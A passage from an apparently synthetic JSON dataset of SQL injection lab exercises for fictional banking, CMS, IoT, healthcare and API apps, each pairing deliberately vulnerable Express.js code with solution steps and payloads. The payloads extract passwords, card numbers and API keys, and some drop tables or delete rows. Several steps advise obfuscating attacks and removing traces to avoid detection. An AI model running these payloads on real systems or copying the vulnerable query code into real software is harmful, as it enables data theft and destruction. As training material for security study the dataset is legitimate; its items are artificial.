    "srcCode": "app.get('/sensor/data', (req, res) => {\n  const sensorId = req.query.sensorId;\n  const query = `SELECT value FROM sensors WHERE id = '${sensorId}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' OR IF(1=1, SLEEP(5), 0) --",
      "' AND SLEEP(5) --",
      "' OR IF(1=2, SLEEP(5), 0) --"
    ]
  },
  {
    "Lab scenario": "CMS user authentication SQL injection in password reset endpoint",
    "Lab Description": "The CMS is vulnerable to SQL injection in the password reset endpoint, where the user ID is used in an SQL query. To solve: Use UNION-based SQL injection to extract user details and bypass the authentication process.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request with the user ID parameter",
      "Test for SQL injection by injecting ' UNION SELECT NULL, username, password FROM users --'",
      "Use UNION to enumerate additional user data like email and password hashes",
      "Use sqlmap to automate the attack and retrieve full user details",
      "Verify the results by attempting to reset the password using the extracted data"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/password/reset', (req, res) => {\n  const userId = req.body.userId;\n  const query = `SELECT username, password FROM users WHERE id = '${userId}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL, username, password FROM users --",
      "' UNION SELECT username, email FROM users --",
      "'; SELECT id FROM users WHERE username='admin' --"
    ]
  },
  {
    "Lab scenario": "Banking portal UNION SQL injection in fund transfer",
    "Lab Description": "The banking portal has a fund transfer feature that is vulnerable to UNION-based SQL injection in the transfer amount parameter. To solve: Use a UNION-based SQL injection to extract sensitive banking information from the database, including user details and account balances.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the fund transfer request and modify the amount parameter",
      "Inject a UNION SQL payload like ' UNION SELECT NULL, username, balance FROM accounts --'",
      "Enumerate columns and extract banking data, such as usernames and account balances",
      "Use sqlmap to automate the extraction of account information",
      "Verify the retrieved data and confirm successful exploitation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/transfer', (req, res) => {\n  const amount = req.body.amount;\n  const query = `SELECT id, account_balance FROM accounts WHERE transfer_amount = '${amount}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL, username, balance FROM accounts --",
      "' UNION SELECT username, password FROM users --",
      "'; SELECT id FROM users WHERE username='admin' --"
    ]
  },
  {
    "Lab scenario": "CMS article editing SQL injection in article ID",
    "Lab Description": "The CMS article editing functionality uses the article ID in an SQL query without sanitizing the input. This opens the door for SQL injection. To solve: Use SQL injection to modify or delete articles from the CMS by exploiting the vulnerability in the article ID parameter.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the article edit request and locate the article ID parameter",
      "Test for SQL injection by injecting ' OR 1=1 --'",
      "Use UNION-based SQL injection to extract data from the 'articles' table",
      "Craft a payload to delete or modify articles",
      "Obfuscate the payload to avoid detection and confirm successful exploitation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/article/edit', (req, res) => {\n  const articleId = req.body.articleId;\n  const query = `UPDATE articles SET title = '${req.body.title}' WHERE id = '${articleId}'`; \n  db.query(query, (err) => {\n    if (err) res.status(500).send('Error');\n    res.send('Article updated');\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT title, content FROM articles --",
      "'; DELETE FROM articles WHERE id=1 --"
    ]
  },
  {
    "Lab scenario": "API gateway SQL injection in API response data query",
    "Lab Description": "The API gateway exposes a vulnerable query endpoint that retrieves response data based on user input. To solve: Use SQL injection to access sensitive data from the API database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a request with the vulnerable parameter (e.g., 'id')",
      "Test for SQL injection by injecting payloads such as ' UNION SELECT NULL, id, data FROM response_data --'",
      "Use sqlmap to automate the attack and retrieve sensitive response data",
      "Verify the response data to confirm successful data extraction",
      "Remove traces of exploitation to avoid detection"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/api/query', (req, res) => {\n  const id = req.query.id;\n  const query = `SELECT id, response_data FROM api_data WHERE id = '${id}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL, id, data FROM response_data --",
      "' UNION SELECT username, password FROM users --",
      "'; SELECT id FROM users WHERE username='admin' --"
    ]
  },
  {
    "Lab scenario": "Banking portal ORDER BY SQL injection in transaction history",
    "Lab Description": "The banking portal transaction history is vulnerable to SQL injection in the 'ORDER BY' clause. An attacker can inject malicious SQL queries into the 'ORDER BY' clause to bypass authentication. To solve: Use UNION-based SQL injection and manipulate the 'ORDER BY' clause to extract sensitive data from the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the transaction history request and test for SQL injection in the 'ORDER BY' parameter",
      "Test with ' ORDER BY 1--' to check for SQL injection vulnerability",
      "Use UNION-based SQL injection to enumerate columns and extract data such as account balances and user information",
      "Verify the attack using sqlmap to automate the extraction process",
      "Obfuscate the attack and avoid detection"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transaction/history', (req, res) => {\n  const accountId = req.query.accountId;\n  const query = `SELECT transaction_id, amount, date FROM transactions WHERE account_id = '${accountId}' ORDER BY date`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' ORDER BY 1--",
      "' UNION SELECT NULL, username, account_balance FROM users --",
      "' UNION SELECT username, password FROM users --"
    ]
  },
  {
    "Lab scenario": "CMS image upload SQL injection in filename parameter",
    "Lab Description": "The CMS allows image uploads but does not sanitize the filename input. This can lead to SQL injection in the filename parameter. To solve: Use UNION-based SQL injection to extract sensitive database information from the vulnerable filename parameter.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to intercept the image upload request and modify the filename parameter",
      "Inject a payload like ' UNION SELECT NULL, username, email FROM users --'",
      "Test and enumerate the columns by adjusting the payload",
      "Extract sensitive data such as usernames and emails",
      "Verify the results by analyzing the returned data"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/upload/image', (req, res) => {\n  const filename = req.body.filename;\n  const query = `INSERT INTO images (filename) VALUES ('${filename}')`; \n  db.query(query, (err) => {\n    if (err) res.status(500).send('Error');\n    res.send('Image uploaded');\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL, username, email FROM users --",
      "' UNION SELECT username, password FROM users --",
      "'; SELECT id FROM users WHERE username='admin' --"
    ]
  },
  {
    "Lab scenario": "Banking portal GROUP BY SQL injection in account transaction summary",
    "Lab Description": "The banking portal has a vulnerability in the 'GROUP BY' clause of the account transaction summary query. The vulnerability allows an attacker to manipulate the query and access sensitive data. To solve: Use SQL injection to manipulate the 'GROUP BY' clause and extract account balances and transaction details.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request and identify the 'GROUP BY' parameter",
      "Test with ' GROUP BY 1 --' to identify the SQL injection point",
      "Inject a UNION-based SQL injection payload to enumerate columns",
      "Extract account balance information and transaction history from the database",
      "Verify the results and confirm successful exploitation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/account/transactions', (req, res) => {\n  const accountId = req.query.accountId;\n  const query = `SELECT transaction_id, amount, date FROM transactions WHERE account_id = '${accountId}' GROUP BY date`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' GROUP BY 1 --",
      "' UNION SELECT NULL, username, account_balance FROM users --",
      "' UNION SELECT username, password FROM users --"
    ]
  },
  {
    "Lab scenario": "API gateway WHERE SQL injection in product details",
    "Lab Description": "The API gateway endpoint for fetching product details is vulnerable to SQL injection in the product ID parameter. This allows an attacker to extract sensitive information from the database. To solve: Use SQL injection to manipulate the 'WHERE' clause and retrieve product data from the database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a request to the product details endpoint with the vulnerable product ID parameter",
      "Test for SQL injection by injecting payloads like ' OR 1=1 --'",
      "Enumerate columns using UNION-based SQL injection to extract sensitive product data",
      "Use sqlmap to automate the extraction of product details",
      "Verify the product data and confirm successful exploitation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/product/details', (req, res) => {\n  const productId = req.query.productId;\n  const query = `SELECT id, name, price FROM products WHERE id = '${productId}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT NULL, name, price FROM products --",
      "'; SELECT id FROM products WHERE name='product1' --"
    ]
  },
  {
    "Lab scenario": "CMS search functionality SQL injection in keywords parameter",
    "Lab Description": "The CMS search functionality is vulnerable to SQL injection in the keywords parameter. This allows an attacker to inject SQL queries into the search functionality. To solve: Use SQL injection to extract sensitive information from the database and enumerate articles.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to intercept the search query request and modify the keywords parameter",
      "Test for SQL injection by injecting ' UNION SELECT NULL, title, content FROM articles --'",
      "Enumerate columns to extract article titles and contents",
      "Verify the extracted article data and confirm the success of the attack",
      "Obfuscate the payload to avoid detection"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/search', (req, res) => {\n  const keywords = req.query.keywords;\n  const query = `SELECT title, content FROM articles WHERE keywords LIKE '%${keywords}%'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL, title, content FROM articles --",
      "' UNION SELECT username, email FROM users --",
      "'; SELECT id FROM users WHERE username='admin' --"
    ]
  },
  {
    "Lab scenario": "Banking portal HAVING SQL injection in account balances",
    "Lab Description": "The banking portal has a vulnerability in the 'HAVING' clause of the account balance query, allowing an attacker to inject SQL and bypass security mechanisms. To solve: Use SQL injection in the HAVING clause to extract sensitive banking information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the account balance request and test for SQL injection in the HAVING clause",
      "Test with ' HAVING 1=1 --' to check for SQL injection vulnerability",
      "Use UNION-based SQL injection to extract sensitive user and account data",
      "Use sqlmap to automate the extraction of account balances",
      "Verify the results by analyzing the returned account information"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/account/balance', (req, res) => {\n  const accountId = req.query.accountId;\n  const query = `SELECT balance FROM accounts WHERE account_id = '${accountId}' HAVING balance > 1000`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' HAVING 1=1 --",
      "' UNION SELECT NULL, username, account_balance FROM users --",
      "' UNION SELECT username, password FROM users --"
    ]
  },
  {
    "Lab scenario": "CMS article deletion SQL injection in article ID",
    "Lab Description": "The CMS has an endpoint for article deletion that is vulnerable to SQL injection in the article ID parameter. An attacker can delete articles or modify the query to retrieve data from the database. To solve: Use SQL injection to delete articles or retrieve sensitive data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the article deletion request and modify the article ID parameter",
      "Inject the payload ' OR 1=1 --' to manipulate the query",
      "Test the injection with UNION-based SQL to enumerate columns",
      "Delete articles or extract data by modifying the query payload",
      "Verify the deletion and confirm the successful exploitation"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.delete('/article/delete', (req, res) => {\n  const articleId = req.body.articleId;\n  const query = `DELETE FROM articles WHERE id = '${articleId}'`; \n  db.query(query, (err) => {\n    if (err) res.status(500).send('Error');\n    res.send('Article deleted');\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT title, content FROM articles --",
      "'; DELETE FROM articles WHERE id=1 --"
    ]
  },
  {
    "Lab scenario": "IoT dashboard ORDER BY SQL injection in sensor status query",
    "Lab Description": "The IoT dashboard is vulnerable to SQL injection in the 'ORDER BY' clause of the sensor status query, allowing an attacker to bypass restrictions and extract sensitive sensor data. To solve: Use SQL injection in the 'ORDER BY' clause to retrieve system status and sensitive sensor data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the sensor status request and identify the 'ORDER BY' parameter",
      "Test for SQL injection with ' ORDER BY 1--'",
      "Inject UNION-based SQL injection to retrieve sensor names and statuses",
      "Use sqlmap to automate data extraction",
      "Confirm successful exploitation by analyzing the response data"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/sensor/status', (req, res) => {\n  const sensorId = req.query.sensorId;\n  const query = `SELECT name, status FROM sensors WHERE sensor_id = '${sensorId}' ORDER BY status`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' ORDER BY 1--",
      "' UNION SELECT NULL, name, status FROM sensors --",
      "' UNION SELECT name, password FROM users --"
    ]
  },
  {
    "Lab scenario": "API gateway WHERE SQL injection in user profile",
    "Lab Description": "The API gateway is vulnerable to SQL injection in the 'WHERE' clause of the user profile query, allowing attackers to extract sensitive user data. The 'user_id' parameter is unsanitized. To solve: Use SQL injection to manipulate the 'WHERE' clause and extract user details.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send a GET request to the user profile endpoint with the vulnerable 'user_id' parameter",
      "Inject payloads like ' OR 1=1 --' to identify the vulnerability",
      "Enumerate columns using UNION-based SQL injection to retrieve sensitive user data",
      "Use sqlmap to automate the exploitation process",
      "Verify the extracted user data and confirm the attack's success"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/user/profile', (req, res) => {\n  const userId = req.query.userId;\n  const query = `SELECT id, name, email FROM users WHERE id = '${userId}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT NULL, username, email FROM users --",
      "' UNION SELECT username, password FROM users --"
    ]
  },
  {
    "Lab scenario": "Banking portal SQL injection in the account balance retrieval",
    "Lab Description": "The banking portal has an SQL injection vulnerability in the account balance retrieval query, specifically in the 'account_id' parameter. This vulnerability allows attackers to access sensitive account balance information. To solve: Use SQL injection to manipulate the query and extract the account balance.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the account balance retrieval request and identify the 'account_id' parameter",
      "Inject payloads like ' OR 1=1 --' to confirm the vulnerability",
      "Enumerate columns using UNION-based SQL injection and extract account balance details",
      "Verify successful exploitation using sqlmap to automate data extraction",
      "Confirm the attack by analyzing the response data"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/account/balance', (req, res) => {\n  const accountId = req.query.accountId;\n  const query = `SELECT balance FROM accounts WHERE account_id = '${accountId}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT NULL, account_id, balance FROM accounts --",
      "' UNION SELECT username, balance FROM users --"
    ]
  },
  {
    "Lab scenario": "CMS comment form SQL injection in comment ID",
    "Lab Description": "The CMS comment form allows for unsanitized input in the comment ID, making it vulnerable to SQL injection. An attacker can manipulate the comment ID parameter to retrieve or modify comments in the database. To solve: Use SQL injection to extract comment data and manipulate the query.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Burp Suite to intercept the comment form submission and modify the comment ID parameter",
      "Inject SQL payloads like ' UNION SELECT NULL, comment, user FROM comments --'",
      "Enumerate columns to extract comment data",
      "Verify the success of the attack by viewing the returned comments",
      "Obfuscate the attack to evade detection"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/comments', (req, res) => {\n  const commentId = req.body.commentId;\n  const query = `SELECT comment, user FROM comments WHERE id = '${commentId}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL, comment, user FROM comments --",
      "' UNION SELECT username, password FROM users --",
      "'; SELECT id FROM comments WHERE user='admin' --"
    ]
  },
  {
    "Lab scenario": "API gateway SQL injection in product details lookup",
    "Lab Description": "The API gateway has an SQL injection vulnerability in the product details lookup query, specifically in the 'product_id' parameter. An attacker can retrieve sensitive product data by exploiting the vulnerability. To solve: Use SQL injection to manipulate the 'product_id' parameter and retrieve product details.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Postman to send a GET request to the product details endpoint with the 'product_id' parameter",
      "Inject payloads like ' OR 1=1 --' to confirm the vulnerability",
      "Use UNION-based SQL injection to enumerate columns and extract product data",
      "Automate the attack using sqlmap to retrieve all product details",
      "Verify the success of the exploitation by reviewing the retrieved data"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/product/details', (req, res) => {\n  const productId = req.query.productId;\n  const query = `SELECT id, name, description FROM products WHERE id = '${productId}'`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT NULL, name, description FROM products --",
      "' UNION SELECT username, price FROM users --"
    ]
  },
  {
    "Lab scenario": "IoT dashboard GROUP BY SQL injection in sensor statistics",
    "Lab Description": "The IoT dashboard is vulnerable to SQL injection in the 'GROUP BY' clause of the sensor statistics query. An attacker can exploit this vulnerability to manipulate the sensor data summary. To solve: Use SQL injection to modify the 'GROUP BY' clause and retrieve sensitive statistics from the sensors database.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the IoT dashboard and identify the 'GROUP BY' parameter",
      "Inject payloads like ' GROUP BY 1 --' to identify the vulnerability",
      "Use UNION-based SQL injection to retrieve sensitive sensor data",
      "Verify successful exploitation by using sqlmap to automate the data extraction process",
      "Confirm the attack by analyzing the retrieved sensor statistics"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/sensor/statistics', (req, res) => {\n  const sensorId = req.query.sensorId;\n  const query = `SELECT name, status, temperature FROM sensors WHERE sensor_id = '${sensorId}' GROUP BY status`; \n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' GROUP BY 1 --",
      "' UNION SELECT NULL, name, status FROM sensors --",
      "' UNION SELECT name, status FROM users --"
    ]
  },
  {
    "Lab scenario": "Banking portal SQL injection in account transfer page",
    "Lab Description": "The banking portal account transfer page is vulnerable to SQL injection in the 'amount' parameter, which is unsanitized. An attacker can exploit this vulnerability to manipulate account transfer operations. To solve: Use SQL injection to bypass the transfer amount validation and retrieve sensitive information.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transfer page and analyze the 'amount' parameter",
      "Test for SQL injection with payloads like ' OR 1=1 --' to confirm the vulnerability",
      "Use UNION-based SQL injection to extract sensitive data from the accounts database",
      "Enumerate sensitive account details such as account numbers and balances",
      "Verify the exploitation by extracting user account information"
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/account/transfer', (req, res) => {\n  const amount = req.body.amount;\n  const query = `INSERT INTO transfers (amount) VALUES ('${amount}')`; \n  db.query(query, (err) => {\n    if (err) res.status(500).send('Error');\n    res.send('Transfer successful');\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "' UNION SELECT NULL, username, balance FROM users --",
      "' UNION SELECT username, password FROM users --"
    ]
  },
  {
    "Lab scenario": "Inventory API vulnerable to SQL injection via product lookup",
    "Lab Description": "SQL injection is possible in the 'product lookup' due to unsanitized input, enabling attackers to extract private records. The application directly interpolates user input into SQL queries. To solve: exploit the injection to access hidden inventory data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept the request using Burp Suite or Postman.",
      "Identify injectable parameter through payload testing like ' OR 1=1 --.",
      "Confirm injection by analyzing unexpected database responses.",
      "Use UNION SELECT or sqlmap to enumerate data from other tables.",
      "Verify the output and document retrieved sensitive data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/api/endpoint', (req, res) => {\n  const param = req.query.param;\n  const query = `SELECT * FROM table WHERE id = '${param}'`;\n  db.query(query, (err, results) => {\n    if (err) res.status(500).send('Error');\n    res.json(results);\n  });\n});",
    "payloads": [
      "' OR 1=1 --",
      "'; DROP TABLE users; --",
      "' UNION SELECT credit_card_number, NULL FROM payments --"
    ]
  },
  {
    "Lab scenario": "Student portal SQL injection in grade report export",
    "Lab Description": "The 'grade report export' fails to sanitize input, leading to SQL injection vulnerabilities in key queries. The application builds an export query using unvalidated student IDs. To solve: extract grade data for all students.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept export request.",
      "Inject test payloads in the student ID parameter.",
      "Detect if unexpected rows are returned.",
      "Use time-based SQLi if blind behavior is observed.",
      "Retrieve and verify all grade report data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/export/grades', (req, res) => {\n  const studentId = req.query.id;\n  const sql = `SELECT * FROM grades WHERE student_id = '${studentId}'`;\n  db.query(sql, (err, results) => {\n    if (err) return res.send(err);\n    res.send(results);\n  });\n});",
    "payloads": [
      "' OR 'a'='a",
      "' UNION SELECT NULL, NULL, password FROM users --",
      "'; DROP TABLE grades; --"
    ]
  },
  {
    "Lab scenario": "Healthcare app SQL injection in prescription history access",
    "Lab Description": "The 'prescription history access' feature allows input to be injected into an SQL query that retrieves prescription records. The application lacks filtering on patient identifiers. To solve: extract prescription data for another patient.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture request to /prescription/history using Postman.",
      "Inject payloads in 'patientId' query param.",
      "Observe database error messages for validation.",
      "Use sqlmap to automate injection and data extraction.",
      "Confirm retrieval of another patient\u00e2\u20ac\u2122s data."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.post('/prescription/history', (req, res) => {\n  const id = req.body.patientId;\n  const sql = `SELECT * FROM prescriptions WHERE patient_id = '${id}'`;\n  db.query(sql, (err, results) => {\n    if (err) res.status(500).send('Error');\n    else res.json(results);\n  });\n});",
    "payloads": [
      "' UNION SELECT NULL, medication, dose FROM prescriptions --",
      "' OR 1=1 --",
      "' AND sleep(5)--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in ORDER BY Clause",
    "Lab Description": "The banking portal's transaction history feature allows users to sort transactions based on various fields. The application directly incorporates user-supplied input into the ORDER BY clause without proper sanitization, leading to a SQL injection vulnerability. To solve: Exploit the ORDER BY clause to retrieve sensitive user information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction history endpoint.",
      "Modify the 'sort' parameter to include SQL injection payloads, such as 'amount DESC, (SELECT password FROM users LIMIT 1)--'.",
      "Observe the application's response for any anomalies or data leakage.",
      "Utilize sqlmap to automate the exploitation and extract sensitive data.",
      "Confirm the retrieval of user passwords or other sensitive information."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/transactions', (req, res) => {\n  const sort = req.query.sort;\n  const query = `SELECT * FROM transactions ORDER BY ${sort}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "amount DESC, (SELECT password FROM users LIMIT 1)--",
      "date ASC, (SELECT email FROM users LIMIT 1)--",
      "id, (SELECT credit_card_number FROM users LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in GROUP BY Clause",
    "Lab Description": "The CMS's analytics feature groups page views by user-defined criteria. The application incorporates user input directly into the GROUP BY clause without validation, leading to a SQL injection vulnerability. To solve: Exploit the GROUP BY clause to extract administrative user data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the request to the analytics endpoint.",
      "Inject SQL payloads into the 'group' parameter, such as 'username, (SELECT password FROM admins)--'.",
      "Analyze the response for any unusual behavior or data leakage.",
      "Employ sqlmap with appropriate flags to automate the exploitation.",
      "Verify the extraction of administrative user credentials."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/analytics', (req, res) => {\n  const group = req.query.group;\n  const query = `SELECT COUNT(*), ${group} FROM page_views GROUP BY ${group}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "username, (SELECT password FROM admins)--",
      "page, (SELECT email FROM users)--",
      "referrer, (SELECT session_token FROM sessions)--"
    ]
  },
  {
    "Lab scenario": "IoT Dashboard SQL Injection in HAVING Clause",
    "Lab Description": "The IoT dashboard's device status report feature allows filtering based on user-defined conditions. The application incorporates user input directly into the HAVING clause without proper sanitization, leading to a SQL injection vulnerability. To solve: Exploit the HAVING clause to retrieve sensitive device information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to send requests to the device status report endpoint.",
      "Inject SQL payloads into the 'filter' parameter, such as 'battery_level > 50 HAVING 1=1 UNION SELECT device_id, secret_key FROM devices--'.",
      "Observe the response for any anomalies or data leakage.",
      "Utilize sqlmap to automate the exploitation and extract sensitive data.",
      "Confirm the retrieval of device IDs and secret keys."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/device-status', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT device_id, status FROM devices WHERE ${filter} GROUP BY device_id HAVING ${filter}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "battery_level > 50 HAVING 1=1 UNION SELECT device_id, secret_key FROM devices--",
      "signal_strength < 30 HAVING 1=1 UNION SELECT device_id, access_token FROM devices--",
      "temperature > 70 HAVING 1=1 UNION SELECT device_id, firmware_version FROM devices--"
    ]
  },
  {
    "Lab scenario": "API Gateway SQL Injection in ORDER BY Clause",
    "Lab Description": "The API gateway's request logging feature allows sorting logs based on user-defined fields. The application directly incorporates user input into the ORDER BY clause without validation, leading to a SQL injection vulnerability. To solve: Exploit the ORDER BY clause to extract sensitive API keys.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the logs endpoint.",
      "Modify the 'sort' parameter to include SQL injection payloads, such as 'timestamp DESC, (SELECT api_key FROM clients LIMIT 1)--'.",
      "Analyze the response for any anomalies or data leakage.",
      "Employ sqlmap to automate the exploitation and extract sensitive data.",
      "Confirm the retrieval of API keys."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/logs', (req, res) => {\n  const sort = req.query.sort;\n  const query = `SELECT * FROM request_logs ORDER BY ${sort}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "timestamp DESC, (SELECT api_key FROM clients LIMIT 1)--",
      "endpoint ASC, (SELECT secret FROM tokens LIMIT 1)--",
      "status_code, (SELECT password FROM users LIMIT 1)--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in GROUP BY Clause",
    "Lab Description": "The banking portal's account summary feature groups transactions by user-defined criteria. The application incorporates user input directly into the GROUP BY clause without proper sanitization, leading to a SQL injection vulnerability. To solve: Exploit the GROUP BY clause to retrieve sensitive financial data.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use OWASP ZAP to intercept the request to the account summary endpoint.",
      "Inject SQL payloads into the 'group' parameter, such as 'account_type, (SELECT balance FROM accounts)--'.",
      "Observe the response for any anomalies or data leakage.",
      "Utilize sqlmap to automate the exploitation and extract sensitive data.",
      "Confirm the retrieval of account balances."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/account-summary', (req, res) => {\n  const group = req.query.group;\n  const query = `SELECT COUNT(*), ${group} FROM transactions GROUP BY ${group}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "account_type, (SELECT balance FROM accounts)--",
      "transaction_type, (SELECT credit_limit FROM cards)--",
      "currency, (SELECT interest_rate FROM loans)--"
    ]
  },
  {
    "Lab scenario": "CMS SQL Injection in HAVING Clause",
    "Lab Description": "The CMS's content analytics feature allows filtering based on user-defined conditions. The application incorporates user input directly into the HAVING clause without validation, leading to a SQL injection vulnerability. To solve: Exploit the HAVING clause to extract sensitive user data.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send requests to the content analytics endpoint.",
      "Inject SQL payloads into the 'filter' parameter, such as 'views > 100 HAVING 1=1 UNION SELECT username, password FROM users--'.",
      "Analyze the response for any anomalies or data leakage.",
      "Employ sqlmap to automate the exploitation and extract sensitive data.",
      "Confirm the retrieval of usernames and passwords."
    ],
    "Vulnerability name": "SQL injection",
    "srcCode": "app.get('/content-analytics', (req, res) => {\n  const filter = req.query.filter;\n  const query = `SELECT content_id, views FROM content WHERE ${filter} GROUP BY content_id HAVING ${filter}`;\n  db.query(query, (err, results) => {\n    if (err) console.error(err);\n    res.json(results);\n  });\n});",
    "payloads": [
      "views > 100 HAVING 1=1 UNION SELECT username, password FROM users--",
      "likes < 50 HAVING 1=1 UNION SELECT email, session_token FROM users--",
      "comments > 10 HAVING 1=1 UNION SELECT name, role FROM admins--"
    ]
  },
  {
    "Lab scenario": "Banking Portal SQL Injection in ORDER BY Clause",
    "Lab Description": "The banking portal's transaction history feature allows users to sort transactions based on various fields. The application directly incorporates user-supplied input into the ORDER BY clause without proper sanitization, leading to a SQL injection vulnerability. To solve: Exploit the ORDER BY clause to retrieve sensitive user information.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the request to the transaction history endpoint.",
      "Modify the 'sort' parameter to include SQL injection payloads, such as 'amount DESC, (SELECT password FROM users LIMIT 1)--'.",
      "Observe the application's response for any anomalies or data leakage.",
